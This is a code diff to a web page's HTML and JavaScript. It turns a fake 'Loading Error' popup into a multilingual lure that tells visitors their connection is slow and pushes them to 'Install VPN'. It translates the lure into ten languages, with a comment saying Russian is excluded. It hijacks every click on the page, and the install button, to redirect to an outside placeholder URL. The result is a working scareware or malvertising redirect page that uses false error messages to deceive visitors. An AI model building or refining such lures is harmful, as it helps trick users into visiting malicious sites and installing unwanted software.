@@ -91,6 +91,7 @@
             transform: translate(-50%, -50%);
             width: 340px;
             padding: 20px;
+
             background: rgba(255, 255, 255, 0.95);
             box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.3);
             border-radius: 10px;
@@ -194,23 +195,51 @@
 
     <!-- Popup modal -->
     <div class="popup" id="popupModal">
-        <h2>Loading Error</h2>
-        <p>Your connection is slow. Install a VPN for faster browsing.</p>
-        <button onclick="installVPN()">Install VPN</button>
+        <h2 id="popupTitle">Loading Error</h2>
+        <p id="popupMessage">Your connection is slow. Install a VPN for faster browsing.</p>
+        <button id="installButton" onclick="installVPN()">Install VPN</button>
     </div>
 
-    <!-- JavaScript for popup functionality -->
+    <!-- JavaScript for page functionality -->
     <script>
-        // Function to show the popup after 2 seconds
-        setTimeout(function() {
-            document.getElementById('popupModal').style.display = 'block';
-            document.getElementById('videoContainer').classList.add('blur-background');
-        }, 2000);
+        // Translations object for 10 languages (excluding Russian)
+        const translations = {
+            en: { title: 'Loading Error', message: 'Your connection is slow. Install a VPN for faster browsing.', button: 'Install VPN' },
+            es: { title: 'Error de carga', message: 'Tu conexión es lenta. Instala un VPN para una navegación más rápida.', button: 'Instalar VPN' },
+            fr: { title: 'Erreur de chargement', message: 'Votre connexion est lente. Installez un VPN pour une navigation plus rapide.', button: 'Installer le VPN' },
+            de: { title: 'Ladefehler', message: 'Ihre Verbindung ist langsam. Installieren Sie ein VPN für schnelleres Surfen.', button: 'VPN installieren' },
+            zh: { title: '加载错误', message: '您的连接很慢。安装VPN以加快浏览速度。', button: '安装VPN' },
+            ar: { title: 'خطأ في التحميل', message: 'اتصالك بطيء. قم بتثبيت VPN لتصفح أسرع.', button: 'تثبيت VPN' },
+            it: { title: 'Errore di caricamento', message: 'La tua connessione è lenta. Installa una VPN per navigare più velocemente.', button: 'Installa VPN' },
+            pt: { title: 'Erro de Carregamento', message: 'Sua conexão está lenta. Instale um VPN para uma navegação mais rápida.', button: 'Instalar VPN' },
+            ja: { title: '読み込みエラー', message: '接続が遅いです。VPNをインストールしてブラウジングを高速化してください。', button: 'VPNをインストール' },
+            hi: { title: 'लोडिंग त्रुटि', message: 'आपका कनेक्शन धीमा है। तेज ब्राउज़िंग के लिए VPN स्थापित करें।', button: 'VPN स्थापित करें' }
+        };
+
+        // Get user's language preference
+        const userLang = navigator.language.slice(0, 2);
+        const defaultLang = 'en';
+        const language = translations[userLang] ? userLang : defaultLang;
+
+        // Apply translations
+        document.getElementById('popupTitle').textContent = translations[language].title;
+        document.getElementById('popupMessage').textContent = translations[language].message;
+        document.getElementById('installButton').textContent = translations[language].button;
+
+        // Redirect on body click
+        document.body.addEventListener('click', () => {
+            window.location.href = 'https://example.com';
+        });
 
         // Function for the "Install VPN" button
         function installVPN() {
-            alert('Redirecting to VPN installation...');
+            window.location.href = 'https://example.com';
         }
+
+        // Show the popup after 2 seconds
+        setTimeout(() => {
+            document.getElementById('popupModal').style.display = 'block';
+        }, 2000);
     </script>
 </body>
 </html>
